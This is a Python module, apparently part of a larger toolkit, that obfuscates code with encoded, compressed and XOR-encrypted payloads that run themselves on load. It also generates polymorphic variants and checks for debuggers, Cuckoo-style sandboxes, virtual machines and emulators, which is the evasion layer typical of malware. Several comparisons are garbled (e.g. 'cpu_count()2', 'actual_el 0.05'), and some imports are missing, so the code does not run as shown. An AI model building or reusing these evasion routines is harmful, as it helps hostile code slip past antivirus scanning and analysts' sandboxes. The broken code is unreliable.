#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
obfuscation.py - Code obfuscation and anti-analysis helper
"""

import ast
import base64
import zlib
import marshal
import random
import string
import hashlib
import itertools
from typing import Dict, List, Optional, Tuple, Any, Union
from pathlib import Path

# Import logger
from .logger import get_logger

logger = get_logger()

class ObfuscationManager:
    """Manages code obfuscation and anti-analysis techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Obfuscation techniques
        self.techniques = {
            'encoding': {
                'base64': self._obfuscate_base64,
                'zlib': self._obfuscate_zlib,
                'marshal': self._obfuscate_marshal,
                'xor': self._obfuscate_xor,
                'rot13': self._obfuscate_rot13
            },
            'string': {
                'split': self._obfuscate_string_split,
                'concat': self._obfuscate_string_concat,
                'encode': self._obfuscate_string_encode,
                'reverse': self._obfuscate_string_reverse
            },
            'control_flow': {
                'junk_code': self._obfuscate_junk_code,
                'opaque_predicates': self._obfuscate_opaque_predicates,
                'control_flow_flattening': self._obfuscate_control_flow_flattening
            },
            'names': {
                'rename': self._obfuscate_rename,
                'unicode': self._obfuscate_unicode_names
            },
            'packing': {
                'self_extracting': self._obfuscate_self_extracting,
                'encrypted_payload': self._obfuscate_encrypted_payload
            }
        }
        
        # Anti-analysis techniques
        self.anti_analysis = {
            'debugger_detection': self._detect_debugger,
            'sandbox_detection': self._detect_sandbox,
            'vm_detection': self._detect_vm,
            'emulator_detection': self._detect_emulator,
            'timing_checks': self._perform_timing_checks
        }
    
    def _obfuscate_base64(self, code: str, iterations: int = 1) -> str:
        """Base64 encoding obfuscation"""
        obfuscated = code.encode('utf-8')
        for _ in range(iterations):
            obfuscated = base64.b64encode(obfuscated)
        
        return f"exec(__import__('base64').b64decode({repr(obfuscated)}).decode('utf-8'))"
    
    def _obfuscate_zlib(self, code: str, level: int = 9) -> str:
        """Zlib compression obfuscation"""
        compressed = zlib.compress(code.encode('utf-8'), level)
        encoded = base64.b64encode(compressed)
        
        return f"""
import zlib, base64
exec(zlib.decompress(base64.b64decode({repr(encoded)})).decode('utf-8'))
"""
    
    def _obfuscate_marshal(self, code: str) -> str:
        """Marshal bytecode obfuscation"""
        compiled = compile(codestring>', 'exec')
        marshaled = marshal.dumps(compiled)
        encoded = base64.b64encode(marshaled)
        
        return f"""
import marshal, base64
exec(marshal.loads(base64.b64decode({repr(encoded)})))
"""
    
    def _obfuscate_xor(self, code: str, key: Optional[str] = None) -> str:
        """XOR encryption obfuscation"""
        if key is None:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        encoded = []
        for i, char in enumerate(code.encode('utf-8')):
            encoded.append(char ^ ord(key[i % len(key)]))
        
        encoded_bytes = bytes(encoded)
        encoded_b64 = base64.b64encode(encoded_bytes).decode('utf-8')
        
        return f"""
key = {repr(key)}
encoded = __import__('base64').b64decode({repr(encoded_b64)})
decoded = bytes(encoded[i] ^ ord(key[i % len(key)]) for i in range(len(encoded)))
exec(decoded.decode('utf-8'))
"""
    
    def _obfuscate_rot13(self, code: str) -> str:
        """ROT13 obfuscation"""
        rot13 = str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
        )
        obfuscated = code.translate(rot13)
        
        return f"""
import codecs
exec(codecs.decode({repr(obfuscated)}, 'rot13'))
"""
    
    def _obfuscate_string_split(self, code: str, parts: int = 3) -> str:
        """Split strings into multiple parts"""
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            if '"' in line or "'" in line:
                # Find strings in line
                import re
                strings = re.findall(r'[\'"](.*?)[\'"]', line)
                for s in strings:
                    if len(s) > 10:  # Only split longer strings
                        chunk_size = len(s) // parts
                        chunks = [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]
                        if len(chunks) > parts:
                            chunks = chunks[:parts]
                        
                        # Reconstruct string
                        reconstructed = ' + '.join([repr(chunk) for chunk in chunks])
                        line = line.replace(repr(s), reconstructed)
            
            obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)
    
    def _obfuscate_string_concat(self, code: str) -> str:
        """Concatenate strings from characters"""
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            if '"' in line or "'" in line:
                import re
                strings = re.findall(r'[\'"](.*?)[\'"]', line)
                for s in strings:
                    if len(s) > 5 and random.random() > 0.7:  # 30% chance
                        # Convert to chr() concatenation
                        chars = [f"chr({ord(c)})" for c in s]
                        reconstructed = ' + '.join(chars)
                        line = line.replace(repr(s), reconstructed)
            
            obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)
    
    def _obfuscate_string_encode(self, code: str) -> str:
        """Encode strings in different encodings"""
        encodings = ['utf-16', 'utf-32', 'latin-1', 'cp1252']
        
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            if '"' in line or "'" in line:
                import re
                strings = re.findall(r'[\'"](.*?)[\'"]', line)
                for s in strings:
                    if len(s) > 3 and random.random() > 0.8:  # 20% chance
                        encoding = random.choice(encodings)
                        try:
                            encoded = s.encode(encoding)
                            reconstructed = f"{repr(encoded)}.decode({repr(encoding)})"
                            line = line.replace(repr(s), reconstructed)
                        except:
                            pass
            
            obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)
    
    def _obfuscate_string_reverse(self, code: str) -> str:
        """Reverse strings"""
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            if '"' in line or "'" in line:
                import re
                strings = re.findall(r'[\'"](.*?)[\'"]', line)
                for s in strings:
                    if len(s) > 5 and random.random() > 0.6:  # 40% chance
                        reconstructed = f"{repr(s[::-1])}[::-1]"
                        line = line.replace(repr(s), reconstructed)
            
            obfuscated_lines.append(line)
        
        return '\n'.join(obfuscated_lines)
    
    def _obfuscate_junk_code(self, code: str, junk_count: int = 10) -> str:
        """Add junk code that does nothing"""
        junk_lines = [
            "if True: pass",
            "x = 1; del x",
            "_ = [i for i in range(10)]",
            "try: pass\nexcept: pass",
            "while False: break",
            "def _junk(): return None",
            "class _JunkClass: pass",
            "import sys; sys.modules.pop('os', None)",
            "__import__('builtins').__dict__.pop('exit', None)",
            "lambda: None"
        ]
        
        lines = code.split('\n')
        obfuscated = []
        
        # Add junk at beginning
        for _ in range(random.randint(1, junk_count // 2)):
            obfuscated.append(random.choice(junk_lines))
        
        # Insert junk randomly
        for line in lines:
            obfuscated.append(line)
            if random.random() > 0.8:  # 20% chance to add junk after line
                obfuscated.append(random.choice(junk_lines))
        
        # Add junk at end
        for _ in range(random.randint(1, junk_count // 2)):
            obfuscated.append(random.choice(junk_lines))
        
        return '\n'.join(obfuscated)
    
    def _obfuscate_opaque_predicates(self, code: str, count: int = 5) -> str:
        """Add opaque predicates (always true/false but hard to analyze)"""
        predicates = [
            # Always true
            "if (hash('predicate') % 2 == hash('predicate') % 2):",
            "if (len(str(id(object()))) > 0):",
            "if (__import__('time').time() > 0):",
            "if (hash(str(random.random())) == hash(str(random.random()))):",
            
            # Always false
            "if (1 == 0):",
            "if (hash('true') == hash('false')):",
            "if (len([]) > 100):",
            "if (__import__('os').name == 'non_existent'):"
        ]
        
        lines = code.split('\n')
        obfuscated = []
        
        for line in lines:
            obfuscated.append(line)
            if random.random() > 0.9 and count > 0:  # 10% chance
                predicate = random.choice(predicates)
                obfuscated.append(predicate)
                obfuscated.append("    pass")
                count -= 1
        
        return '\n'.join(obfuscated)
    
    def _obfuscate_control_flow_flattening(self, code: str) -> str:
        """Flatten control flow using switch-like structure"""
        try:
            tree = ast.parse(code)
            
            # This is a simplified version
            # In production, would need to analyze and rewrite control flow
            
            # For now, just wrap in a dispatcher
            dispatcher = """
def _dispatcher():
    state = 0
    while True:
        if state == 0:
            # Original code
            {code}
            state = 999
        elif state == 999:
            break
    return

_dispatcher()
""".format(code=code.replace('\n', '\n            '))
            
            return dispatcher
            
        except Exception as e:
            logger.error(f"Control flow flattening error: {e}", module="obfuscation")
            return code
    
    def _obfuscate_rename(self, code: str) -> str:
        """Rename variables and functions to random names"""
        try:
            tree = ast.parse(code)
            
            # Collect names to rename
            names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load):
                    names.add(node.id)
                elif isinstance(node, ast.FunctionDef):
                    names.add(node.name)
                elif isinstance(node, ast.ClassDef):
                    names.add(node.name)
                elif isinstance(node, ast.arg):
                    names.add(node.arg)
            
            # Filter out builtins and common names
            builtins = set(dir(__builtins__)) | {'self', 'cls', 'args', 'kwargs'}
            names = names - builtins
            
            # Generate new names
            name_map = {}
            for name in names:
                # Generate random name
                new_name = '_' + ''.join(random.choices(string.ascii_lowercase, k=8))
                name_map[name] = new_name
            
            # Rename in AST
            class Renamer(ast.NodeTransformer):
                def visit_Name(self, node):
                    if node.id in name_map:
                        node.id = name_map[node.id]
                    return node
                
                def visit_FunctionDef(self, node):
                    if node.name in name_map:
                        node.name = name_map[node.name]
                    return self.generic_visit(node)
                
                def visit_ClassDef(self, node):
                    if node.name in name_map:
                        node.name = name_map[node.name]
                    return self.generic_visit(node)
                
                def visit_arg(self, node):
                    if node.arg in name_map:
                        node.arg = name_map[node.arg]
                    return node
            
            transformer = Renamer()
            transformed = transformer.visit(tree)
            
            # Convert back to code
            import astor
            return astor.to_source(transformed)
            
        except Exception as e:
            logger.error(f"Renaming error: {e}", module="obfuscation")
            return code
    
    def _obfuscate_unicode_names(self, code: str) -> str:
        """Use Unicode characters in names"""
        try:
            tree = ast.parse(code)
            
            # Unicode characters that look like ASCII
            unicode_map = {
                'a': 'а',  # Cyrillic
                'c': 'с',
                'e': 'е',
                'o': 'о',
                'p': 'р',
                'x': 'х',
                'y': 'у'
            }
            
            # Collect names
            names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name):
                    names.add(node.id)
                elif isinstance(node, ast.FunctionDef):
                    names.add(node.name)
                elif isinstance(node, ast.ClassDef):
                    names.add(node.name)
            
            # Filter
            builtins = set(dir(__builtins__))
            names = names - builtins
            
            # Create name map
            name_map = {}
            for name in names:
                if len(name) > 2 and random.random() > 0.7:  # 30% chance
                    new_name = ''
                    for char in name:
                        if char.lower() in unicode_map and random.random() > 0.5:
                            new_name += unicode_map[char.lower()]
                        else:
                            new_name += char
                    name_map[name] = new_name
            
            # Rename in AST
            class UnicodeRenamer(ast.NodeTransformer):
                def visit_Name(self, node):
                    if node.id in name_map:
                        node.id = name_map[node.id]
                    return node
                
                def visit_FunctionDef(self, node):
                    if node.name in name_map:
                        node.name = name_map[node.name]
                    return self.generic_visit(node)
                
                def visit_ClassDef(self, node):
                    if node.name in name_map:
                        node.name = name_map[node.name]
                    return self.generic_visit(node)
            
            transformer = UnicodeRenamer()
            transformed = transformer.visit(tree)
            
            import astor
            return astor.to_source(transformed)
            
        except Exception as e:
            logger.error(f"Unicode renaming error: {e}", module="obfuscation")
            return code
    
    def _obfuscate_self_extracting(self, code: str) -> str:
        """Create self-extracting archive style obfuscation"""
        # Compress and encode
        compressed = zlib.compress(code.encode('utf-8'), 9)
        encoded = base64.b64encode(compressed)
        
        self_extracting = f"""
import zlib, base64, sys

# Embedded payload
PAYLOAD = {repr(encoded.decode('utf-8'))}

def extract():
    '''Extract and execute payload'''
    try:
        decoded = base64.b64decode(PAYLOAD)
        decompressed = zlib.decompress(decoded)
        code = decompressed.decode('utf-8')
        
        # Execute in separate namespace
        namespace = {{}}
        exec(code, namespace)
        
        # Call main if exists
        if 'main' in namespace:
            namespace['main']()
            
    except Exception as e:
        print(f"Extraction error: {{e}}", file=sys.stderr)

if __name__ == '__main__':
    extract()
"""
        
        return self_extracting
    
    def _obfuscate_encrypted_payload(self, code: str, key: str = None) -> str:
        """Create encrypted payload with runtime decryption"""
        if key is None:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        # XOR encrypt
        encrypted = []
        for i, char in enumerate(code.encode('utf-8')):
            encrypted.append(char ^ ord(key[i % len(key)]))
        
        encrypted_bytes = bytes(encrypted)
        encoded = base64.b64encode(encrypted_bytes).decode('utf-8')
        
        encrypted_payload = f"""
import base64

# Encrypted payload
ENCRYPTED = {repr(encoded)}
KEY = {repr(key)}

def decrypt_and_execute():
    '''Decrypt and execute payload'''
    try:
        # Decode
        decoded = base64.b64decode(ENCRYPTED)
        
        # XOR decrypt
        decrypted = bytes(decoded[i] ^ ord(KEY[i % len(KEY)]) for i in range(len(decoded)))
        
        # Execute
        code = decrypted.decode('utf-8')
        exec(code)
        
    except Exception as e:
        print(f"Decryption error: {{e}}")

# Auto-execute
decrypt_and_execute()
"""
        
        return encrypted_payload
    
    def _detect_debugger(self) -> bool:
        """Detect if running under debugger"""
        try:
            # Check for debugger via trace function
            import sys
            has_trace = sys.gettrace() is not None
            
            # Check for common debugger modules
            debugger_modules = ['pdb', 'ipdb', 'pydevd', 'debugpy', 'winpdb']
            for module in debugger_modules:
                if module in sys.modules:
                    return True
            
            # Windows specific: Check for debugger via IsDebuggerPresent
            if sys.platform == 'win32':
                import ctypes
                kernel32 = ctypes.windll.kernel32
                return bool(kernel32.IsDebuggerPresent())
            
            return has_trace
            
        except Exception:
            return False
    
    def _detect_sandbox(self) -> bool:
        """Detect sandbox environment"""
        try:
            import os
            import sys
            import platform
            
            checks = []
            
            # Check for common sandbox indicators
            sandbox_files = [
                '/proc/self/status',  # Cuckoo sandbox
                '/tmp/cuckoo',  # Cuckoo
                '/var/run/lima',  # Lima
                '/.dockerenv',  # Docker
            ]
            
            for file in sandbox_files:
                if os.path.exists(file):
                    checks.append(True)
            
            # Check hostname
            hostname = platform.node().lower()
            sandbox_hostnames = ['cuckoo', 'sandbox', 'malware', 'analysis', 'vm']
            for name in sandbox_hostnames:
                if name in hostname:
                    checks.append(True)
            
            # Check CPU cores (sandboxes often have few)
            import multiprocessing
            if multiprocessing.cpu_count()2:
                checks.append(True)
            
            # Check RAM (sandboxes often have limited RAM)
            import psutil
            if psutil.virtual_memory().total2 * 1024**3:  # Less than 2GB
                checks.append(True)
            
            return any(checks)
            
        except Exception:
            return False
    
    def _detect_vm(self) -> bool:
        """Detect virtual machine"""
        try:
            import platform
            import subprocess
            
            checks = []
            
            # Check via system manufacturer
            if platform.system() == 'Windows':
                import wmi
                c = wmi.WMI()
                for computer in c.Win32_ComputerSystem():
                    manufacturer = computer.Manufacturer.lower()
                    if any(vm in manufacturer for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                        checks.append(True)
            
            # Check via model
            if platform.system() == 'Linux':
                try:
                    with open('/sys/class/dmi/id/product_name', 'r') as f:
                        product = f.read().lower()
                        if any(vm in product for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                            checks.append(True)
                except:
                    pass
            
            # Check via MAC address (VM vendors)
            try:
                import uuid
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                              for ele in range(0,8*6,8)][::-1])
                vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', 
                                  '08:00:27', '0a:00:27']
                if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                    checks.append(True)
            except:
                pass
            
            return any(checks)
            
        except Exception:
            return False
    
    def _detect_emulator(self) -> bool:
        """Detect emulator (for mobile/embedded)"""
        try:
            # This is simplified - real detection would be more complex
            import os
            import sys
            
            checks = []
            
            # Check for QEMU
            if os.path.exists('/proc/self/status'):
                with open('/proc/self/status', 'r') as f:
                    content = f.read()
                    if 'QEMU' in content.upper():
                        checks.append(True)
            
            # Check CPU flags for emulation
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    content = f.read()
                    if 'hypervisor' in content.lower():
                        checks.append(True)
            
            return any(checks)
            
        except Exception:
            return False
    
    def _perform_timing_checks(self) -> bool:
        """Perform timing-based anti-analysis"""
        try:
            import time
            
            # Check if execution is too fast (emulator/sandbox)
            start = time.time()
            
            # Do some computation
            for _ in range(100000):
                _ = hash(str(time.time()))
            
            elapsed = time.time() - start
            
            # If too fast, might be emulator
            if elapsed0.01:  # Less than 10ms
                return True
            
            # Check sleep skipping (some sandboxes skip sleeps)
            start = time.time()
            time.sleep(0.1)  # Sleep for 100ms
            actual_elapsed = time.time() - start
            
            # If sleep was much shorter, might be sandbox
            if actual_el 0.05:  # Less than 50ms
                return True
            
            return False
            
        except Exception:
            return False
    
    def obfuscate_code(self, code: str, techniques: List[str] = None, 
                      intensity: int = 3) -> str:
        """Apply obfuscation techniques to code"""
        if techniques is None:
            # Select techniques based on intensity
            if intensity == 1:
                techniques = ['base64', 'string_split']
            elif intensity == 2:
                techniques = ['zlib', 'string_concat', 'junk_code']
            elif intensity == 3:
                techniques = ['marshal', 'xor', 'rename', 'junk_code', 'opaque_predicates']
            else:  # Maximum
                techniques = ['encrypted_payload', 'control_flow_flattening', 
                            'unicode', 'junk_code', 'opaque_predicates']
        
        obfuscated = code
        
        logger.info(f"Starting obfuscation with {len(techniques)} techniques", module="obfuscation")
        
        # Apply each technique
        for technique in techniques:
            try:
                # Find which category the technique belongs to
                applied = False
                for category, techs in self.techniques.items():
                    if technique in techs:
                        obfuscated = techs[technique](obfuscated)
                        applied = True
                        logger.debug(f"Applied {technique} obfuscation", module="obfuscation")
                        break
                
                if not applied:
                    logger.warning(f"Unknown obfuscation technique: {technique}", module="obfuscation")
                    
            except Exception as e:
                logger.error(f"Error applying {technique}: {e}", module="obfuscation")
        
        # Calculate metrics
        original_size = len(code.encode('utf-8'))
        obfuscated_size = len(obfuscated.encode('utf-8'))
        ratio = obfuscated_size / original_size if original_size > 0 else 1
        
        logger.info(f"Obfuscation complete: {original_size} -> {obfuscated_size} bytes (ratio: {ratio:.2f})", 
                   module="obfuscation")
        
        return obfuscated
    
    def check_anti_analysis(self) -> Dict[str, bool]:
        """Run all anti-analysis checks"""
        results = {}
        
        logger.info("Running anti-analysis checks", module="obfuscation")
        
        for check_name, check_func in self.anti_analysis.items():
            try:
                result = check_func()
                results[check_name] = result
                
                if result:
                    logger.warning(f"Anti-analysis detected: {check_name}", module="obfuscation")
                else:
                    logger.debug(f"Anti-analysis check passed: {check_name}", module="obfuscation")
                    
            except Exception as e:
                logger.error(f"Error in {check_name}: {e}", module="obfuscation")
                results[check_name] = False
        
        # Overall detection
        detected = any(results.values())
        results['overall_detected'] = detected
        
        if detected:
            logger.warning(f"Anti-analysis environment detected", module="obfuscation")
        
        return results
    
    def obfuscate_file(self, input_file: str, output_file: str = None, 
                      techniques: List[str] = None, intensity: int = 3) -> bool:
        """Obfuscate a Python file"""
        try:
            if not os.path.exists(input_file):
                logger.error(f"Input file not found: {input_file}", module="obfuscation")
                return False
            
            # Read input file
            with open(input_file, 'r', encoding='utf-8') as f:
                code = f.read()
            
            # Obfuscate
            obfuscated = self.obfuscate_code(code, techniques, intensity)
            
            # Determine output file
            if output_file is None:
                output_file = input_file.replace('.py', '_obfuscated.py')
            
            # Write output
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(obfuscated)
            
            # Add shebang if original had one
            if code.startswith('#!'):
                with open(output_file, 'r+', encoding='utf-8') as f:
                    content = f.read()
                    f.seek(0, 0)
                    f.write('#!' + sys.executable + '\n' + content)
            
            logger.info(f"File obfuscated: {input_file} -> {output_file}", module="obfuscation")
            return True
            
        except Exception as e:
            logger.error(f"File obfuscation error: {e}", module="obfuscation")
            return False
    
    def create_polymorphic_variant(self, code: str, variant_count: int = 5) -> List[str]:
        """Create multiple polymorphic variants of the same code"""
        variants = []
        
        logger.info(f"Creating {variant_count} polymorphic variants", module="obfuscation")
        
        for i in range(variant_count):
            # Different techniques for each variant
            techniques = random.sample(list(self.techniques['encoding'].keys()), 2)
            techniques.extend(random.sample(list(self.techniques['string'].keys()), 2))
            
            if random.random() > 0.5:
                techniques.append('junk_code')
            
            if random.random() > 0.7:
                techniques.append('rename')
            
            # Obfuscate
            variant = self.obfuscate_code(code, techniques, intensity=random.randint(2, 4))
            variants.append(variant)
            
            logger.debug(f"Created variant {i+1}/{variant_count}", module="obfuscation")
        
        return variants
    
    def get_techniques_info(self) -> Dict[str, List[str]]:
        """Get information about available techniques"""
        info = {}
        for category, techniques in self.techniques.items():
            info[category] = list(techniques.keys())
        return info
    
    def get_status(self) -> Dict[str, Any]:
        """Get obfuscation manager status"""
        return {
            'techniques_categories': len(self.techniques),
            'total_techniques': sum(len(t) for t in self.techniques.values()),
            'anti_analysis_checks': len(self.anti_analysis),
            'platform': sys.platform,
            'python_version': sys.version
        }

# Global instance
_obfuscation_manager = None

def get_obfuscation_manager(config: Dict = None) -> ObfuscationManager:
    """Get or create obfuscation manager instance"""
    global _obfuscation_manager
    
    if _obfuscation_manager is None:
        _obfuscation_manager = ObfuscationManager(config)
    
    return _obfuscation_manager

if __name__ == "__main__":
    # Test the obfuscation manager
    manager = get_obfuscation_manager()
    
    # Test code
    test_code = """
def hello_world():
    print("Hello, World!")
    return 42

if __name__ == "__main__":
    result = hello_world()
    print(f"Result: {result}")
"""
    
    # Test obfuscation
    print("Original code:")
    print(test_code[:200] + "..." if len(test_code) > 200 else test_code)
    
    # Obfuscate
    obfuscated = manager.obfuscate_code(test_code, intensity=2)
    print("\nObfuscated code (first 300 chars):")
    print(obfuscated[:300] + "...")
    
    # Test anti-analysis
    print("\nRunning anti-analysis checks...")
    checks = manager.check_anti_analysis()
    for check, result in checks.items():
        print(f"{check}: {'DETECTED' if result else 'not detected'}")
    
    # Show techniques
    print("\nAvailable techniques:")
    info = manager.get_techniques_info()
    for category, techniques in info.items():
        print(f"{category}: {', '.join(techniques[:3])}...")
    
    # Show status
    status = manager.get_status()
    print(f"\n🌀 Obfuscation Manager Status: {status}")
    
    print("\n✅ Obfuscation tests completed!")
